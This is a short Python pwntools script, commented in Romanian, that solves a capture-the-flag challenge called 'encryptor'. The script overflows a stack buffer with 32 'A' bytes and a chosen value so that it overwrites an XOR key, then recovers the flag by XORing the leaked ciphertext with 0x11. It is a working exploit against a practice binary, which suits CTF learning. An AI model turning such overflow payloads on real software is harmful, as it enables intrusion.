#!/usr/bin/env python3
# ============================================================================
# CTF: encryptor — stack BOF (suprascrierea cheii de criptare)
# Vulnerabilitate: overflow care suprascrie cheia XOR cu o valoare cunoscuta
#   (32 'A' + 0x11111111). Flag-ul e apoi "criptat" cu cheia noastra => XOR cu
#   0x11 il decripteaza. Bytes negativi ies ca "ffffffXX" (sign-extension la %02x).
# Binar: ELF 32-bit (i386), not stripped | NX OFF · fara canary · No-PIE · Partial RELRO
#   - Protectiile nu conteaza: nu redirectezi executia, controlezi doar cheia XOR
#     prin overflow, deci recuperezi plaintext-ul flag-ului dintr-un leak logic.
# ============================================================================
import re
import sys
from pwn import *

context.binary = elf = ELF('./encryptor')
context.log_level = 'error'         # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./encryptor')

p = connect()

p.recvuntil(b"Any other words at the end?")
payload = b'A' * 32
payload += p32(0x11111111)
p.sendline(payload)

p.recvuntil(b"Here is the encrypted flag\n")
hexline = p.recvline().strip().decode()

# Each byte is printed with %02x after a signed-char sign-extension, so
# negative bytes come out as "ffffffXX"; take the low byte of each unit.
enc = [int(m[-2:], 16) for m in re.findall(r'f{6}..|..', hexline)]
flag = bytes(b ^ 0x11 for b in enc).rstrip(b'\x00')
print(flag.decode(errors='replace'))
